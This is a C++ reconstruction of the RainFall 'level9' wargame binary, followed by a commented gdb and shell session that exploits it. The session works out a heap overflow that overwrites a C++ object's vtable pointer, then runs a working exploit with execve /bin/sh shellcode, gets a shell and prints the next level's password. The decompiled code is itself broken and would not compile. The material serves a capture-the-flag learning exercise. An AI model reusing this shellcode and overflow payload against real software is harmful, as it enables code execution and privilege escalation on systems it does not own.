#include <iostream>
#include <cstring>
#include <cstdlib>

class N {
public:
    int value;
    char *str;

    N(int val) : value(val) {}

    int operator+(N& other) {
        return this->value + other.value;
    }

    int operator-(N& other) {
        return this->value - other.value;
    }

    void setAnnotation(const char* s) {
        memcpy(str, s, strlen(s));
    }
};

int main(int argc, char** argv) {
    if (argc < 2) {
        std::exit(1);
    }

    N* n1 = new N(5);
    N* n2 = new N(6);
    n1->setAnnotation(argv[1]);

    // code is some kind of a function pointer
    (**(code **)*n2)(n2, s1);

    // std::cout << "Result: " << result << std::endl;

    delete n1;
    delete n2;

    return 0;
}

/**

: Authentication failure
$ su level9
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9
level9@RainFall:~$ ./level9 
level9@RainFall:~$ gdb level9 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level9/level9...(no debugging symbols found)...done.
(gdb) disas main 
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   %ebp
   0x080485f5 <+1>:	mov    %esp,%ebp
   0x080485f7 <+3>:	push   %ebx
   0x080485f8 <+4>:	and    $0xfffffff0,%esp
   0x080485fb <+7>:	sub    $0x20,%esp
   0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	movl   $0x1,(%esp)
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	movl   $0x6c,(%esp)
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:	mov    %eax,%ebx
   0x0804861e <+42>:	movl   $0x5,0x4(%esp)
   0x08048626 <+50>:	mov    %ebx,(%esp)
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:	movl   $0x6c,(%esp)
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:	mov    %eax,%ebx
   0x08048640 <+76>:	movl   $0x6,0x4(%esp)
   0x08048648 <+84>:	mov    %ebx,(%esp)
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:	mov    %ebx,0x18(%esp)
   0x08048654 <+96>:	mov    0x1c(%esp),%eax
   0x08048658 <+100>:	mov    %eax,0x14(%esp)
   0x0804865c <+104>:	mov    0x18(%esp),%eax
   0x08048660 <+108>:	mov    %eax,0x10(%esp)
   0x08048664 <+112>:	mov    0xc(%ebp),%eax
   0x08048667 <+115>:	add    $0x4,%eax
   0x0804866a <+118>:	mov    (%eax),%eax
   0x0804866c <+120>:	mov    %eax,0x4(%esp)
   0x08048670 <+124>:	mov    0x14(%esp),%eax
   0x08048674 <+128>:	mov    %eax,(%esp)
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    0x10(%esp),%eax
---Type <return> to continue, or q <return> to quit---
   0x08048680 <+140>:	mov    (%eax),%eax
   0x08048682 <+142>:	mov    (%eax),%edx
   0x08048684 <+144>:	mov    0x14(%esp),%eax
   0x08048688 <+148>:	mov    %eax,0x4(%esp)
   0x0804868c <+152>:	mov    0x10(%esp),%eax
   0x08048690 <+156>:	mov    %eax,(%esp)
   0x08048693 <+159>:	call   *%edx
   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:	leave  
   0x08048699 <+165>:	ret    
End of assembler dump.
(gdb) quit
level9@RainFall:~$ ./level9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
^CSegmentation fault (core dumped)
level9@RainFall:~$ ^C
level9@RainFall:~$ ^C
level9@RainFall:~$ ./level9 AAAAA
level9@RainFall:~$ ./level9 AAAAAAAAAAAAAAAAAAAAA
level9@RainFall:~$ ./level9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
level9@RainFall:~$ ./level9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
^CSegmentation fault (core dumped)
level9@RainFall:~$ ^C
level9@RainFall:~$ ^C
level9@RainFall:~$ gdb level9 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level9/level9...(no debugging symbols found)...done.
(gdb) r <<< `python -c "print 'A' * 120"`
Starting program: /home/user/level9/level9 <<< `python -c "print 'A' * 120"`
[Inferior 1 (process 4326) exited with code 01]
(gdb) r <<< `python -c "print 'A' * 200"`
Starting program: /home/user/level9/level9 <<< `python -c "print 'A' * 200"`
[Inferior 1 (process 4331) exited with code 01]
(gdb) r <<< `python -c "print 'A' * 250"`
Starting program: /home/user/level9/level9 <<< `python -c "print 'A' * 250"`
[Inferior 1 (process 4334) exited with code 01]
(gdb) r `python -c "print 'A' * 200"`
Starting program: /home/user/level9/level9 `python -c "print 'A' * 200"`

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) disas mai  
No symbol table is loaded.  Use the "file" command.
(gdb) disas main 
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   %ebp
   0x080485f5 <+1>:	mov    %esp,%ebp
   0x080485f7 <+3>:	push   %ebx
   0x080485f8 <+4>:	and    $0xfffffff0,%esp
   0x080485fb <+7>:	sub    $0x20,%esp
   0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	movl   $0x1,(%esp)
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	movl   $0x6c,(%esp)
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:	mov    %eax,%ebx
   0x0804861e <+42>:	movl   $0x5,0x4(%esp)
   0x08048626 <+50>:	mov    %ebx,(%esp)
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:	movl   $0x6c,(%esp)
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:	mov    %eax,%ebx
   0x08048640 <+76>:	movl   $0x6,0x4(%esp)
   0x08048648 <+84>:	mov    %ebx,(%esp)
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:	mov    %ebx,0x18(%esp)
   0x08048654 <+96>:	mov    0x1c(%esp),%eax
   0x08048658 <+100>:	mov    %eax,0x14(%esp)
   0x0804865c <+104>:	mov    0x18(%esp),%eax
   0x08048660 <+108>:	mov    %eax,0x10(%esp)
   0x08048664 <+112>:	mov    0xc(%ebp),%eax
   0x08048667 <+115>:	add    $0x4,%eax
   0x0804866a <+118>:	mov    (%eax),%eax
   0x0804866c <+120>:	mov    %eax,0x4(%esp)
   0x08048670 <+124>:	mov    0x14(%esp),%eax
   0x08048674 <+128>:	mov    %eax,(%esp)
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    0x10(%esp),%eax
   0x08048680 <+140>:	mov    (%eax),%eax
=> 0x08048682 <+142>:	mov    (%eax),%edx
   0x08048684 <+144>:	mov    0x14(%esp),%eax
   0x08048688 <+148>:	mov    %eax,0x4(%esp)
   0x0804868c <+152>:	mov    0x10(%esp),%eax
   0x08048690 <+156>:	mov    %eax,(%esp)
   0x08048693 <+159>:	call   *%edx
   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:	leave  
   0x08048699 <+165>:	ret    
---Type <return> to continue, or q <return> to quit---
End of assembler dump.
(gdb) b *
Argument required (expression to compute).
(gdb) b *0x08048693
Breakpoint 1 at 0x8048693
(gdb) r `python -c "print 'A' * 200"`
The program being debugged has been started already.
Start it from the beginning? (y or n) n
Program not restarted.
(gdb) set confirm off
(gdb) r `python -c "print 'A' * 200"`

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) b *
Argument required (expression to compute).
(gdb) b *0x08048680
Breakpoint 2 at 0x8048680
(gdb) r `python -c "print 'A' * 200"`

Breakpoint 2, 0x08048680 in main ()
(gdb) p $eax
$1 = 134520952
(gdb) x/s $eax
0x804a078:	 'A' <repeats 92 times>
(gdb) disas main 
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   %ebp
   0x080485f5 <+1>:	mov    %esp,%ebp
   0x080485f7 <+3>:	push   %ebx
   0x080485f8 <+4>:	and    $0xfffffff0,%esp
   0x080485fb <+7>:	sub    $0x20,%esp
   0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	movl   $0x1,(%esp)
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	movl   $0x6c,(%esp)
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:	mov    %eax,%ebx
   0x0804861e <+42>:	movl   $0x5,0x4(%esp)
   0x08048626 <+50>:	mov    %ebx,(%esp)
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:	movl   $0x6c,(%esp)
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:	mov    %eax,%ebx
   0x08048640 <+76>:	movl   $0x6,0x4(%esp)
   0x08048648 <+84>:	mov    %ebx,(%esp)
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:	mov    %ebx,0x18(%esp)
   0x08048654 <+96>:	mov    0x1c(%esp),%eax
   0x08048658 <+100>:	mov    %eax,0x14(%esp)
   0x0804865c <+104>:	mov    0x18(%esp),%eax
   0x08048660 <+108>:	mov    %eax,0x10(%esp)
   0x08048664 <+112>:	mov    0xc(%ebp),%eax
   0x08048667 <+115>:	add    $0x4,%eax
   0x0804866a <+118>:	mov    (%eax),%eax
   0x0804866c <+120>:	mov    %eax,0x4(%esp)
   0x08048670 <+124>:	mov    0x14(%esp),%eax
   0x08048674 <+128>:	mov    %eax,(%esp)
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    0x10(%esp),%eax
=> 0x08048680 <+140>:	mov    (%eax),%eax
   0x08048682 <+142>:	mov    (%eax),%edx
   0x08048684 <+144>:	mov    0x14(%esp),%eax
   0x08048688 <+148>:	mov    %eax,0x4(%esp)
   0x0804868c <+152>:	mov    0x10(%esp),%eax
   0x08048690 <+156>:	mov    %eax,(%esp)
   0x08048693 <+159>:	call   *%edx
   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:	leave  
   0x08048699 <+165>:	ret    
---Type <return> to continue, or q <return> to quit---
End of assembler dump.
(gdb) 
(gdb) x/s 0x10(%esp)
A syntax error in expression, near `%esp)'.
(gdb) x/s $esp+10   
0xbffff64a:	 "\377\277U\236\327\267x\240\004\b\b\240\004\bx\240\004\b\b\240\004\bp\207\004\b\364\277\356\267"
(gdb) b *0x0804867c
Breakpoint 3 at 0x804867c
(gdb) r `python -c "print 'A' * 200"`

Breakpoint 3, 0x0804867c in main ()
(gdb) x/s $esp+10
0xbffff64a:	 "\377\277U\236\327\267x\240\004\b\b\240\004\bx\240\004\b\b\240\004\bp\207\004\b\364\277\356\267"
(gdb) x/w $esp+10
0xbffff64a:	 U"\x9e55bfff\xa078b7d7\xa0080804\xa0780804\xa0080804\x87700804\xbff40804\xb7ee\x4d30000\x2b7d6\xf7040000\xf710bfff\xc860bfff\xb7fd\xf71c0000\xf710bfff\xbfff\x82880000\xbff40804\xb7ee"
(gdb) x/wx $esp+10
0xbffff64a:	0x9e55bfff
(gdb) x/wx *($esp)+10
Attempt to dereference a generic pointer.
(gdb) x/wx $esp    
0xbffff640:	0x0804a008
(gdb) x/s 0x0804a008
0x804a008:	 "H\210\004\b", 'A' <repeats 196 times>...
(gdb) x/s 0x0804a008+10
0x804a012:	 'A' <repeats 194 times>
(gdb) x/s $esp+10
0xbffff64a:	 "\377\277U\236\327\267x\240\004\b\b\240\004\bx\240\004\b\b\240\004\bp\207\004\b\364\277\356\267"
(gdb) r `python -c "print '\x12^CQuit' * 200"`
(gdb) x/s 0x0804a008+2 
0x804a00a:	 "\004\b", 'A' <repeats 198 times>...
(gdb) x/s 0x0804a008+3
0x804a00b:	 "\b", 'A' <repeats 199 times>...
(gdb) x/s 0x0804a008+4
0x804a00c:	 'A' <repeats 200 times>
(gdb) x/s $esp+10
0xbffff64a:	 "\377\277U\236\327\267x\240\004\b\b\240\004\bx\240\004\b\b\240\004\bp\207\004\b\364\277\356\267"
(gdb) x/w $esp   
0xbffff640:	 U"\x804a008\xbffff83d\xbffff710\xb7d79e55\x804a078\x804a008\x804a078\x804a008\x8048770\xb7eebff4"
(gdb) x/wx $esp
0xbffff640:	0x0804a008
(gdb) x/s 0x0804a008
0x804a008:	 "H\210\004\b", 'A' <repeats 196 times>...
(gdb) x/s 0x0804a008+4
0x804a00c:	 'A' <repeats 200 times>
(gdb) r `python -c "print 'BBBB' + 'A' * 200"`

Breakpoint 3, 0x0804867c in main ()
(gdb) x/s 0x804a00c
0x804a00c:	 "BBBB", 'A' <repeats 196 times>...
(gdb) c

Breakpoint 2, 0x08048680 in main ()
(gdb) disas main 
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   %ebp
   0x080485f5 <+1>:	mov    %esp,%ebp
   0x080485f7 <+3>:	push   %ebx
   0x080485f8 <+4>:	and    $0xfffffff0,%esp
   0x080485fb <+7>:	sub    $0x20,%esp
   0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	movl   $0x1,(%esp)
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	movl   $0x6c,(%esp)
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:	mov    %eax,%ebx
   0x0804861e <+42>:	movl   $0x5,0x4(%esp)
   0x08048626 <+50>:	mov    %ebx,(%esp)
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:	movl   $0x6c,(%esp)
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:	mov    %eax,%ebx
   0x08048640 <+76>:	movl   $0x6,0x4(%esp)
   0x08048648 <+84>:	mov    %ebx,(%esp)
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:	mov    %ebx,0x18(%esp)
   0x08048654 <+96>:	mov    0x1c(%esp),%eax
   0x08048658 <+100>:	mov    %eax,0x14(%esp)
   0x0804865c <+104>:	mov    0x18(%esp),%eax
   0x08048660 <+108>:	mov    %eax,0x10(%esp)
   0x08048664 <+112>:	mov    0xc(%ebp),%eax
   0x08048667 <+115>:	add    $0x4,%eax
   0x0804866a <+118>:	mov    (%eax),%eax
   0x0804866c <+120>:	mov    %eax,0x4(%esp)
   0x08048670 <+124>:	mov    0x14(%esp),%eax
   0x08048674 <+128>:	mov    %eax,(%esp)
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    0x10(%esp),%eax
=> 0x08048680 <+140>:	mov    (%eax),%eax
   0x08048682 <+142>:	mov    (%eax),%edx
   0x08048684 <+144>:	mov    0x14(%esp),%eax
   0x08048688 <+148>:	mov    %eax,0x4(%esp)
   0x0804868c <+152>:	mov    0x10(%esp),%eax
   0x08048690 <+156>:	mov    %eax,(%esp)
   0x08048693 <+159>:	call   *%edx
   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:	leave  
   0x08048699 <+165>:	ret    
---Type <return> to continue, or q <return> to quit---
End of assembler dump.
(gdb) i b 
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0x08048693 <main+159>
2       breakpoint     keep y   0x08048680 <main+140>
	breakpoint already hit 1 time
3       breakpoint     keep y   0x0804867c <main+136>
	breakpoint already hit 1 time
(gdb) del 3
(gdb) r `python -c "print 'BBBB' + 'A' * 200"`

Breakpoint 2, 0x08048680 in main ()
(gdb) x/s $eax
0x804a078:	 'A' <repeats 96 times>
(gdb) r `python -c "print 'BBBB' + 'A' * 200"`

Breakpoint 2, 0x08048680 in main ()
(gdb) x/s $eax
0x804a078:	 'A' <repeats 96 times>
(gdb) r `python -c "print 'BBBB' + 'A' * 92"`

Breakpoint 2, 0x08048680 in main ()
(gdb) x/s $eax
0x804a078:	 "H\210\004\b"
(gdb) r `python -c "print 'BBBB' + 'A' * 900"`

Breakpoint 2, 0x08048680 in main ()
(gdb) x/s $eax
0x804a078:	 'A' <repeats 200 times>...
(gdb) r `python -c "print 'BBBB' + 'A' * 100"`

Breakpoint 2, 0x08048680 in main ()
(gdb) x/s $eax
0x804a078:	 "H\210\004\b"
(gdb) r `python -c "print 'BBBB' + 'A' * 150"`

Breakpoint 2, 0x08048680 in main ()
(gdb) x/s $eax
0x804a078:	 'A' <repeats 46 times>
(gdb) r `python -c "print 'BBBB' + 'A' * 108 + 'CCCC'"`

Breakpoint 2, 0x08048680 in main ()
(gdb) x/s $eax
0x804a078:	 "AAAACCCC"
(gdb) r `python -c "print 'BBBB' + 'A' * 104 + 'CCCC'"`

Breakpoint 2, 0x08048680 in main ()
(gdb) x/s $eax
0x804a078:	 "CCCC"
(gdb) r `python -c "print 'A' * 108 + 'CCCC'"`

Breakpoint 2, 0x08048680 in main ()
(gdb) x/s $eax
0x804a078:	 "CCCC"
(gdb) c

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) x/s 0x804a00c
0x804a00c:	 'A' <repeats 108 times>, "CCCC"
(gdb) r `python -c "print 'A' * 108 + '\x0c\xa0\x04\x08'"`

Breakpoint 2, 0x08048680 in main ()
(gdb) c

Breakpoint 1, 0x08048693 in main ()
(gdb) disas main 
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   %ebp
   0x080485f5 <+1>:	mov    %esp,%ebp
   0x080485f7 <+3>:	push   %ebx
   0x080485f8 <+4>:	and    $0xfffffff0,%esp
   0x080485fb <+7>:	sub    $0x20,%esp
   0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	movl   $0x1,(%esp)
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	movl   $0x6c,(%esp)
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:	mov    %eax,%ebx
   0x0804861e <+42>:	movl   $0x5,0x4(%esp)
   0x08048626 <+50>:	mov    %ebx,(%esp)
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:	movl   $0x6c,(%esp)
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:	mov    %eax,%ebx
   0x08048640 <+76>:	movl   $0x6,0x4(%esp)
   0x08048648 <+84>:	mov    %ebx,(%esp)
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:	mov    %ebx,0x18(%esp)
   0x08048654 <+96>:	mov    0x1c(%esp),%eax
   0x08048658 <+100>:	mov    %eax,0x14(%esp)
   0x0804865c <+104>:	mov    0x18(%esp),%eax
   0x08048660 <+108>:	mov    %eax,0x10(%esp)
   0x08048664 <+112>:	mov    0xc(%ebp),%eax
   0x08048667 <+115>:	add    $0x4,%eax
   0x0804866a <+118>:	mov    (%eax),%eax
   0x0804866c <+120>:	mov    %eax,0x4(%esp)
   0x08048670 <+124>:	mov    0x14(%esp),%eax
   0x08048674 <+128>:	mov    %eax,(%esp)
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    0x10(%esp),%eax
   0x08048680 <+140>:	mov    (%eax),%eax
   0x08048682 <+142>:	mov    (%eax),%edx
   0x08048684 <+144>:	mov    0x14(%esp),%eax
   0x08048688 <+148>:	mov    %eax,0x4(%esp)
   0x0804868c <+152>:	mov    0x10(%esp),%eax
   0x08048690 <+156>:	mov    %eax,(%esp)
=> 0x08048693 <+159>:	call   *%edx
   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:	leave  
   0x08048699 <+165>:	ret    
---Type <return> to continue, or q <return> to quit---
End of assembler dump.
(gdb) x/wx $edx
0x41414141:	Cannot access memory at address 0x41414141
(gdb) x/s 0x804a00c
0x804a00c:	 'A' <repeats 108 times>, "\f\240\004\b"
(gdb) x/s 0x804a00c+4
0x804a010:	 'A' <repeats 104 times>, "\f\240\004\b"
(gdb) r `python -c "print '\x1-\xa0\x04\x08' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' * 83 + '\x0c\xa0\x04\x08'"`
ValueError: invalid \x escape
[Inferior 1 (process 4386) exited with code 01]
(gdb) r `python -c "print '\x10\xa0\x04\x08' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' * 83 + '\x0c\xa0\x04\x08'"`

Breakpoint 2, 0x08048680 in main ()
(gdb) c

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) r `python -c "print '\x10\xa0\x04\x08' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A' *  83 + '\x0c\xa0\x04\x08'"`

Breakpoint 2, 0x08048680 in main ()
(gdb) c

Breakpoint 1, 0x08048693 in main ()
(gdb) c
process 4392 is executing new program: /bin/dash
$ ^C
Program received signal SIGINT, Interrupt.
0xb7fdd428 in ?? ()
(gdb) quit
level9@RainFall:~$ ./level9 `python -c "print '\x10\xa0\x04\x08' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A' *  83 + '\x0c\xa0\x04\x08'"`
$ ls
ls: cannot open directory .: Permission denied
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
level9@RainFall:~$ ./level9 `python -c "print '\x10\xa0\x04\x08' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A' *  83 + '\x0c\xa0\x04\x08'"`



*/